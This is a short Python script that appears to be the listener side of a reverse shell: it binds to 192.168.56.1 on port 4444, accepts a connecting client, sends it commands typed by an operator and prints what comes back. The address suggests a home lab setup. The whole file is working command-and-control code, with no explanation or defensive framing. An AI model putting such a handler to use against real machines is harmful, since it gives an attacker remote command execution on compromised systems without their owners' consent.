import sys
import socket

SERVER_IP = "192.168.56.1"
PORT = 4444

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_IP, PORT))

s.listen(1)

while True:
    print(f"[+]listening as{SERVER_IP}:{PORT}")

    client = s.accept()
    print(f"[+] client connected {client[1]}")

    client[0].send("connected".encode())
    while True:
        cmd = input(">>>")
        client[0].send(cmd.encode())

        if cmd.lower() in ["quit", "exit", "q", "x"]:
            break

        result = client[0].recv(10240).decode()
        print(result)

    client[0].close()

    cmd = input("wait for new client y/n") or "y"
    if cmd.lower() in ["n", "no"]:
        break

s.close()
